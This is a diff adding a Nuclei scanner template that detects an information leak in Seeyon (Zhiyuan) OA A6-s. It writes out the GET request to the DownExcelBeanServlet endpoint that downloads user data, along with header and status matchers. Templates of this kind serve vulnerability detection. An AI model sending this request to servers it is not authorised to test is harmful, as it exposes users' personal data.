@@ -1,0 +1,25 @@
+id: seeyon-oa-info-leak
+
+info:
+  name: Zhiyuan Oa A6-s info Leak
+  author: pikpikcu
+  severity: info
+  tags: zhiyuan,leak,disclosure,seeyon
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "attachment"
+          - "application/x-msdownload"
+        part: header
+        condition: and
+
+      - type: status
+        status:
+          - 200
